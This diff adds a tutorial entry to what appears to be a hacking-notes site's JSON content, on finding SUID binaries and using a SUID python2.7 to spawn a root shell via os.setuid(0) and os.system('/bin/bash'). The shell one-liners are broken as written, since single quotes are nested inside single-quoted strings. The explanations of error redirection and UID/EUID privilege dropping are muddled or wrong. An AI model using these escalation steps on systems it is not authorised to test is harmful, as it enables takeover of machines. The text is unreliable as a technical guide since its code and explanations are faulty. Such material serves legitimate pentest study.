@@ -1033,5 +1033,117 @@
     ],
     "youtubeUrl":"https://youtu.be/pN1WefcyaAI",
     "goodbyeMessage":"Good luck, and happy hacking 🚀"
+  },
+    {
+    "id": 3,
+    "slug": "suid",
+    "title": "SUID BINARY ENUMERATION",
+    "category": "notes",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "What is a SUID binary??"
+      },
+      {
+        "type": "paragraph",
+        "id": "pgp-definition",
+        "text": "SUID (Set User ID) is a special permission bit that allows a file to run with the privileges of its owner, not the user executing it."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "find / -user root -perm -4000 -type f 2>/dev/null"
+      },
+      {
+        "type": "paragraph",
+        "id": "pgp-definition",
+        "text": "The above command would list all binaries where SUID bit is set."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "-rwsr-xr-x 1 root root 50000 Apr  2023 /usr/bin/python2.7"
+      },
+      {
+        "type": "paragraph",
+        "id": "pgp-definition",
+        "text": "For example if you have a user azid and if he has the access to execute it, then it will be run with the privileges of its owner not from the person privileges who is executing it."
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "Let's Break this command shall we?"
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "-type f"
+      },
+      {
+        "type": "paragraph",
+        "id": "pgp-definition",
+        "text": "This says go ad match files but but but only match the regular files, dnt match folders, symlinks and etc just match regular files."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "2>/dev/null"
+      },
+      {
+        "type": "paragraph",
+        "id": "pgp-definition",
+        "text": "This 2> says that redirects error to output in short this command suppress errors if there is any error."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "-perm -4000"
+      },
+      {
+        "type": "paragraph",
+        "id": "pgp-definition",
+        "text": "This says find any files with permission 4000, 4000 is suid in number terms."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "/usr/bin/python2.7 -c 'import os; os.execl('/bin/sh','sh')'"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "Now we will run this command as it will execute that import os as root because we are using suid binary file, it will only work if UID and EUID is same if they are not same it will drop privileges."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "/usr/bin/python2.7 -c 'import os; print(os.getuid(), os.geteuid())'"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "This will print UID and EUID if they are not same so ofc when you call suid file it will drop privileges, it will show something like this (33, 0)."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system('/bin/bash')'"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "Here we changed our UID to 0, btw 0 UID is of root, so now when it will check UID is 0 and EUID is 0 then it will give us a root shell."
+      }
+    ],
+    "goodbyeMessage":"Good luck, and happy hacking 🚀"
   }
 ]
